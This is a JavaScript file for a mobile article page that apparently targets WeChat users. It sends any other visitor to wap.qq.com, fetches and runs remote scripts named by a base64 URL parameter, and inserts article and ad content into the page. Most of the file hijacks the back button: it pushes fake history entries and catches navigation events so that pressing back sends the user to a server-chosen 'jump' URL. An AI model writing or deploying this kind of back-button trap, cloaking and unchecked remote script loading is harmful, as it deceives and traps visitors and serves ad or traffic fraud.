var is_wx = 0;
var browser = {
	versions: function () {
		var u = navigator.userAgent, app = navigator.appVersion;
		return {   
			trident: u.indexOf('Trident') > -1,
			presto: u.indexOf('Presto') > -1, 
			webKit: u.indexOf('AppleWebKit') > -1, 
			gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, 
			mobile: !!u.match(/AppleWebKit.*Mobile.*/), 
			ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
			android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1,
			iPhone: u.indexOf('iPhone') > -1, 
			iPad: u.indexOf('iPad') > -1,
			webApp: u.indexOf('Safari') == -1 
		};
	}(),
	language: (navigator.browserLanguage || navigator.language).toLowerCase()
}
if (browser.versions.mobile) {
	var ua = navigator.userAgent.toLowerCase();
	if (ua.match(/MicroMessenger/i) == "micromessenger") {
		   is_wx = 1;
	}
}
if(!is_wx){
	 window.location = 'http://wap.qq.com/';
}
var res = window.atob(getQf("c")); 
var res = JSON.parse(res);
$.ajax({
  url: burl + "/ac/"+res.u+"/"+res.c+".js?time="+ Math.ceil((new Date).getTime()/60000),
  dataType: "script",
  cache: true
});
$.ajax({
  url: burl+"/gview/w?u="+res.u+"&code="+res.c+"&d="+document.domain +"&time="+ new Date().getTime(),
  dataType: "script",
  cache: true
});
function GetContent(json){
      $("title").html(json.title);
	  $("#title").html(json.title);
	  $("#times").html(json.times);
      $("#content").html(json.content);
}
function Getre(json){
  if(json.code == 0){
	 $("title").html(json.msg);
	 $("#title").html(json.msg);
	 $("#content").html(json.msg);
  }else{
	  $("#read").html(json.reads);
	  $("#isxs").html(json.isxs);
	  $("#ad_img_url").html(json.ad_img_url);
      function urlCallBack(callback) {
            if (callback && callback.code == 0) {
                back_jump_url=callback.url;
            }
        }
        function back(){
            if (self != top) {
                parent.postMessage(JSON.stringify({type:2,url:back_jump_url}),'*');
            }else{
                location.href = back_jump_url;
            }
        }
		var back_jump_url = json.back;
        if(back_jump_url!=''){
            if (back_jump_url.indexOf("/task/getUrl")>-1){
                var xhr = new XMLHttpRequest();
                xhr.open("GET", back_jump_url, false);
                xhr.onreadystatechange = function () 
                {
                    if (xhr.readyState == 4 && xhr.status == 200 || xhr.status == 304) 
                    {
                        back_jump_url = JSON.parse(xhr.responseText)["jump"];
                        urlCallBack({code:0,url:back_jump_url});
                    }
                
                };
                xhr.send();
            }
            if (back_jump_url.indexOf("/getBackLink")>-1){
                $.get(back_jump_url,{},function(res){
                    if (res.indexOf("/task/getUrl")>-1){
                        var xhr = new XMLHttpRequest();
                        xhr.open("GET", res, false);
                        xhr.onreadystatechange = function () 
                        {
                            if (xhr.readyState == 4 && xhr.status == 200 || xhr.status == 304) 
                            {
                                back_jump_url = JSON.parse(xhr.responseText)["jump"];
                                urlCallBack({code:0,url:back_jump_url});
                            }
                        };
                        xhr.send();
                    }else{
                        back_jump_url = res;
                    }
                });
            }
            history.pushState(history.length+1, "message", window.location.href.split('#')[0]+"#"+new Date().getTime());
            history.pushState(history.length+1, "message", window.location.href.split('#')[0]);
            if(navigator.userAgent.indexOf('Android') != -1){
                if(typeof(tbsJs) != "undefined"){
                    tbsJs.onReady('{useCachedApi : "true"}', function(e) {});
                    window.onhashchange=function(){
                        back();
                    };
                }else{
                    var pop = 0;  
                    window.onhashchange = function(event) {
                        pop++;
                        if (pop >= 3) {
                            back();
                        }else{
                            history.go(1);
                        }
                    };
                    history.go(-1);
                }
            }else{
                window.onhashchange=function(){
                    back();
                };
            }
        }
	 }
}
function getQf(variable){
       var query = window.location.search.substring(1);
       var vars = query.split("&");
       for (var i=0;i<vars.length;i++) {
               var pair = vars[i].split("=");
               if(pair[0] == variable){return pair[1];}
       }
       return(false);
}